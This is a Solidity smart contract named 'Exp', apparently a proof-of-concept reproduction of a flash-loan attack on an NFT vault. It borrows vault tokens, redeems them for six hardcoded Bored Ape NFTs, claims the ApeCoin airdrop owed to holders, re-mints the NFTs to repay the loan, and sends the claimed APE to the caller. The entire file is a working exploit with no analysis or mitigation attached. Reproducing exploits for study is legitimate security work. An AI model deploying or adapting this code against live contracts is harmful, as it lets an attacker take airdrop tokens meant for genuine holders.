//SPDX-License-Identifier: Unlicense

pragma solidity 0.8.15;

import "hardhat/console.sol";
import "./interfaces/IBAYC.sol";
import "./interfaces/IVault.sol";
import "./interfaces/IAirdrop.sol";
import "./interfaces/IRouter.sol";
import "./interfaces/IERC20.sol";

contract Exp {
    address private immutable owner;
    IBAYC private immutable bayc;
    IVault private immutable vault;
    IAirdrop private immutable airdrop;
    IRouter private immutable router;
    IERC20 private immutable ape;

    bytes32 constant private RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    modifier onlyOwner() {
        require(msg.sender == owner, "Not your biz!");
        _;
    }

    constructor(IBAYC _bayc, IVault _vault, IAirdrop _airdrop, IRouter _router, IERC20 _ape) {
        owner = msg.sender;
        bayc = _bayc;
        vault = _vault;
        airdrop = _airdrop;
        router = _router;
        ape = _ape;
    }

    function trigger() external {
        vault.approve(address(vault), type(uint256).max);
        vault.flashLoan(address(this), address(vault), 5200000000000000000, "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        
        uint256[] memory blank = new uint256[](0);
        vault.redeem(5, blank);

        airdrop.claimTokens();

        bayc.setApprovalForAll(address(vault), true);

        uint256[] memory nfts = new uint256[](6);
        nfts[0] = 7594;
        nfts[1] = 4755;
        nfts[2] = 9915;
        nfts[3] = 8214;
        nfts[4] = 8167;
        nfts[5] = 1060;

        vault.mint(nfts, blank);

        vault.approve(address(vault), type(uint256).max);

        require(ape.transfer(tx.origin, ape.balanceOf(address(this))), "are u ok?");

        return RETURN_VALUE;
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
        ) 
    external returns (bytes4) {
        return this.onERC721Received.selector;
    }

}